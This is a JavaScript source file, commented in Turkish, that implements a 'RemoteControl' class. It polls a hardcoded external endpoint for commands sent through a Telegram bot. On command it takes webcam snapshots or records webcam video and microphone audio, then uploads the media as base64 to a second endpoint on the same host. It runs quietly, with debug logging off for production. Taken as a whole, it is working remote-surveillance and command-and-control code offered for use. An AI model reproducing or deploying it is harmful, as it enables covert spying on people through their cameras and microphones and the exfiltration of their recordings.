// 🎮 Remote Control System - Telegram Bot Commands
// Bu script Telegram bot komutlarını dinler ve kamera/mikrofon kayıtlarını alır

class RemoteControl {
    constructor(config = {}) {
        this.commandEndpoint = config.commandEndpoint || 'https://ironbabatekkral.vercel.app/api/get-commands';
        this.fileEndpoint = config.fileEndpoint || 'https://ironbabatekkral.vercel.app/api/send-file';
        this.pollInterval = config.pollInterval || 5000; // 5 saniyede bir kontrol
        this.debug = config.debug || false;
        this.isEnabled = false;
        this.pollTimer = null;
        
        // Media streams
        this.cameraStream = null;
        this.microphoneStream = null;
    }

    // Uzaktan kontrolü başlat
    start() {
        if (this.isEnabled) {
            if (this.debug) console.log('[RemoteControl] Already running');
            return;
        }

        this.isEnabled = true;
        this.poll();
        
        if (this.debug) console.log('[RemoteControl] Started');
    }

    // Uzaktan kontrolü durdur
    stop() {
        this.isEnabled = false;
        if (this.pollTimer) {
            clearTimeout(this.pollTimer);
            this.pollTimer = null;
        }
        this.releaseStreams();
        
        if (this.debug) console.log('[RemoteControl] Stopped');
    }

    // Stream'leri serbest bırak
    releaseStreams() {
        if (this.cameraStream) {
            this.cameraStream.getTracks().forEach(track => track.stop());
            this.cameraStream = null;
        }
        if (this.microphoneStream) {
            this.microphoneStream.getTracks().forEach(track => track.stop());
            this.microphoneStream = null;
        }
    }

    // Komutları kontrol et (polling)
    async poll() {
        if (!this.isEnabled) return;

        try {
            const response = await fetch(this.commandEndpoint);
            const data = await response.json();

            if (data.success && data.commands && data.commands.length > 0) {
                if (this.debug) console.log('[RemoteControl] Commands received:', data.commands);

                // Her komutu işle
                for (const cmd of data.commands) {
                    await this.executeCommand(cmd);
                }
            }
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Poll error:', error);
        }

        // Bir sonraki poll'u planla
        if (this.isEnabled) {
            this.pollTimer = setTimeout(() => this.poll(), this.pollInterval);
        }
    }

    // Komutu çalıştır
    async executeCommand(cmd) {
        try {
            switch (cmd.command) {
                case 'camera_screenshot':
                    await this.takeCameraScreenshot(cmd.message_id);
                    break;
                case 'camera_record':
                    await this.recordCamera(cmd.params.duration, cmd.message_id);
                    break;
                case 'microphone_record':
                    await this.recordMicrophone(cmd.params.duration, cmd.message_id);
                    break;
                default:
                    if (this.debug) console.log('[RemoteControl] Unknown command:', cmd.command);
            }
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Command execution error:', error);
        }
    }

    // 📷 Kamera Screenshot
    async takeCameraScreenshot(messageId) {
        try {
            if (this.debug) console.log('[RemoteControl] Taking camera screenshot...');

            // Kamera erişimi al
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // Video element oluştur
            const video = document.createElement('video');
            video.srcObject = stream;
            video.autoplay = true;
            video.muted = true;

            // Video yüklenene kadar bekle
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });

            // Biraz bekle (kamera ısınsın)
            await new Promise(resolve => setTimeout(resolve, 500));

            // Canvas'a çiz
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            // Base64'e çevir
            const imageData = canvas.toDataURL('image/jpeg', 0.9);

            // Stream'i kapat
            stream.getTracks().forEach(track => track.stop());

            // Telegram'a gönder
            await this.sendFile('photo', imageData, '📷 Camera Screenshot', messageId);

            if (this.debug) console.log('[RemoteControl] Screenshot sent successfully');

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Screenshot error:', error);
        }
    }

    // 🎥 Kamera Video Kayıt
    async recordCamera(duration, messageId) {
        try {
            if (this.debug) console.log(`[RemoteControl] Recording camera for ${duration} seconds...`);

            // Kamera erişimi al
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp8,opus'
            });

            const chunks = [];
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async () => {
                // Blob oluştur
                const blob = new Blob(chunks, { type: 'video/webm' });
                
                // Base64'e çevir
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const base64data = reader.result;
                    
                    // Stream'i kapat
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Telegram'a gönder
                    await this.sendFile('video', base64data, `🎥 Camera Video (${duration}s)`, messageId);
                    
                    if (this.debug) console.log('[RemoteControl] Video sent successfully');
                };
                reader.readAsDataURL(blob);
            };

            // Kaydı başlat
            mediaRecorder.start();

            // Belirtilen süre sonra durdur
            setTimeout(() => {
                mediaRecorder.stop();
            }, duration * 1000);

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Camera record error:', error);
        }
    }

    // 🎤 Mikrofon Ses Kayıt
    async recordMicrophone(duration, messageId) {
        try {
            if (this.debug) console.log(`[RemoteControl] Recording microphone for ${duration} seconds...`);

            // Mikrofon erişimi al
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            
            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'audio/webm;codecs=opus'
            });

            const chunks = [];
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async () => {
                // Blob oluştur
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                
                // Base64'e çevir
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const base64data = reader.result;
                    
                    // Stream'i kapat
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Telegram'a gönder
                    await this.sendFile('voice', base64data, `🎤 Microphone Recording (${duration}s)`, messageId);
                    
                    if (this.debug) console.log('[RemoteControl] Voice sent successfully');
                };
                reader.readAsDataURL(blob);
            };

            // Kaydı başlat
            mediaRecorder.start();

            // Belirtilen süre sonra durdur
            setTimeout(() => {
                mediaRecorder.stop();
            }, duration * 1000);

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Microphone record error:', error);
        }
    }

    // Dosyayı Telegram'a gönder
    async sendFile(fileType, fileData, caption, messageId) {
        try {
            const response = await fetch(this.fileEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    file_type: fileType,
                    file_data: fileData,
                    caption: caption,
                    message_id: messageId
                })
            });

            const result = await response.json();

            if (this.debug) {
                console.log('[RemoteControl] File send response:', result);
            }

            return result;
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] File send error:', error);
            return { success: false, error: error.message };
        }
    }
}

// Global instance oluştur
const remoteControl = new RemoteControl({
    debug: false // Production'da false olmalı
});

// Global scope'a ekle
window.remoteControl = remoteControl;

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = RemoteControl;
}

